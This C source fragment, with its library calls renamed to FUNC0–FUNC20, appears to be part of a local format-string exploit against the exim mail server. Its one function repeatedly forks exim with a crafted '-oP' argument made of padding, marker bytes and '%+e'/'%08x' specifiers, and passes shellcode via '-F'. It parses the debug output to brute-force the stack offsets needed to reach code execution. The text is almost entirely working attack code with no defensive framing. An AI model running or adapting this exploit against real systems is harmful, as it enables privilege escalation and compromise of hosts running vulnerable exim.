#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int PADDING ; 
 int /*<<< orphan*/  SIGINT ; 
 int FUNC0 (char*) ; 
 int FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int,int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,char*,char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC7 (int,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int,int /*<<< orphan*/ *) ; 
 int FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  path ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 scalar_t__ FUNC12 (int*) ; 
 int port ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 int FUNC17 (char*) ; 
 scalar_t__ FUNC18 (char*,char*) ; 
 int /*<<< orphan*/  FUNC19 (int) ; 

void FUNC20(int *bigs, int *smalls, int *bytes_written)
{
   int cpid;
   int pipedes[2];
   int found=0;
   int bs=0, ss=1;
   char hilf[10];

   FUNC13("Getting stackpops ...\n");
   *bigs=0;
   *smalls=1;

   while(!found)
   {
      if(FUNC12(pipedes))
      {
         FUNC11("pipe");
         FUNC5(1);
      }  
   
      port++;
      cpid=FUNC9();
      if(cpid==0)
      {
         // child process
         
         char fs[10000];
         int i;
   
         // close stderr and recreate it pointing into the pipe
         FUNC2(2);
         FUNC3(pipedes[1],2);

         // make new formatstring

         FUNC16(fs,"/tmp/%s");
         for(i=0;i<PADDING;i++)
            FUNC15(fs,"Z");
         FUNC15(fs,"0000AAAA0000AAAA0000AAAA0000AAAA");
         for(i=0;i<bs;i++)
            FUNC15(fs,"%+e");
         for(i=0;i<ss;i++)
            FUNC15(fs,"%08x");

         // execute exim
         FUNC14(hilf,"%d",port);
         FUNC4(path,"exim","-bd","-d","-oX",hilf,"-oP",fs,"-F",shellcode,NULL);
      }
      else if(cpid>0)
      {
         // parent process 
         FILE *fp=FUNC7(pipedes[0],"r");
         char line[10000];
         if(fp) 
         {
            do
            {
               FUNC8(line,10000,fp);
               line[FUNC17(line)-1]=0;
   /*  printf("%s\n",line);  ENABLE THIS LINE WHEN THE PROGRAM GETS STUCK! */
               if(FUNC18(line,"pid written to ") ||
                  FUNC18(line,"failed to open pid file "))
               {
                  if(FUNC18(line,"nan")) FUNC13("watch out, nan encountered.\n");
                  if(FUNC1(line)==1)
                  {
                     // stackpops found, values are OK
                     found=1;
                     bs--;         // revert 2 stackpops
                     FUNC13("Stackpops found ;-)\n");
                     *bigs=bs;
                     *smalls=ss;
                     *bytes_written=FUNC0(line)-13;
                  }
                  else
                  {
                     // increase stackpops
                     ss++;
                     if(ss==3) bs++, ss=1;
                     FUNC13("trying bs=%d, ss=%d\n",bs,ss);
                  }
               }
            } while(!FUNC18(line,"Listening..."));
            FUNC6(fp);
         }
         else FUNC11("fdopen");
         FUNC10(cpid,SIGINT);
         FUNC19(100000);
      }
      else FUNC11("fork"); 
      FUNC2(pipedes[0]);
      FUNC2(pipedes[1]);
   }
}